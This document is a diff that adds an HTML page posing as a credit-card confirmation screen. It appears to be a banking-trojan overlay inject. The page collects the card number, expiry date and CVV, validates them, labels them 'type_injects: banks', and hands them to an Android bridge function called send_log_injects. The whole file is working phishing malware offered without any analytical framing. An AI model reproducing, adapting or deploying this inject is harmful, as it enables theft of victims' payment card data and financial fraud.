@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <title>Document</title>
+<style>
+    
+    .input {
+            width: 100%;
+            border: 0;
+            border: 1px solid #e5e5e5;
+            margin-top: 15px;
+            height: 44px;
+            border-radius: 5px;
+            color: #000;
+            padding-left: 0;
+            transition: all 0.2s ease;
+            padding-right: 25px;
+            font-weight: 500;
+            background-color: #ffffff;
+            padding: 10px;
+    }
+
+        .input:focus {
+            border: 2px solid #199b3b;
+        }
+
+        input,
+        button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        .button {
+            width: 100%;
+            padding: 8px;
+            color: #fff;
+            background-color: #199b3b;
+            border-radius: 5px;
+            border: 0;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        form{
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        }
+        .input::placeholder{
+            color:#504f4f;
+        }
+        .button:disabled {
+            opacity: 0.4;
+            background-color: #cbcbcb;
+        }
+        .error {
+            border-color: #f00 !important;
+        }
+
+</style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width:100%;"src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA4QAAACDCAIAAABawUJJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkZDODM3NzY5RjcxRTExRUNCQ0MyODY4RkI4NEQwODJCIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkZDODM3NzZBRjcxRTExRUNCQ0MyODY4RkI4NEQwODJCIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RkM4Mzc3NjdGNzFFMTFFQ0JDQzI4NjhGQjg0RDA4MkIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RkM4Mzc3NjhGNzFFMTFFQ0JDQzI4NjhGQjg0RDA4MkIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz45FP3jAAAPf0lEQVR42uzdf0xX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">
+        </header>
+        <section>
+            <h4 style="font-size: 20px;font-weight: 500;">
+                Confirm with your credit card
+            </h4>
+            <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input" placeholder="Credit Card" autocomplete="off">
+
+            <input type="tel" style="width: 58%;float: left;margin-top: 5px;" id="exp" name="exp" maxlength="5" onkeyup="check7();check8()" class="input" placeholder="Expiration date" autocomplete="off">
+
+            <input type="password" style="width: 40%;float: right;margin-bottom: 20px;margin-top: 5px;" id="cvv" name="cvv" maxlength="3" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">  
+
+        <input type="button" class="button" disabled id="sendData" value="Sign in">
+            <p style="text-align: center;font-size: 16px;font-weight: 500;color: #757575;">
+                By tapping proceed you agree to our <u>Terms and Conditions</u>
+            </p>
+    </section>
+    </form>
+<script>
+        $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+
+    var sendData = document.getElementById('sendData');
+
+    $('.cool-input__input').on('input', function () {
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+            }
+        }
+
+        function check8() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+</script>
+</body>
+</html>
